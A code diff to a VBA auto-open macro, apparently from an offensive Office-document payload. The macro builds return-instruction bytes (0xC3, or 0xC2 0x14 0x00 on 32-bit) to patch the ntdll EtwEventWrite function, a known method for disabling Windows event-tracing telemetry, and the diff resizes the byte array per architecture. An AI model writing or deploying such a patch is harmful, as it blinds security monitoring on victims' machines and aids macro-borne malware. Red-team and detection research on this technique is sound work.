@@ -9,12 +9,13 @@ Sub AutoOpen()
     Dim ntdllDLL As LongPtr
     Dim EtwEventWriteAddr As LongPtr
     Dim result As Long
-    Dim MyByteArray(6) As Byte
     Dim ArrayPointer As LongPtr
 
     #If Win64 Then
+        Dim MyByteArray(1) As Byte
         MyByteArray(0) = 195 ' 0xC3
     #Else
+        Dim MyByteArray(4) As Byte
         MyByteArray(0) = 194 ' 0xC2
         MyByteArray(1) = 20 ' 0x14
         MyByteArray(2) = 0 ' 0x00
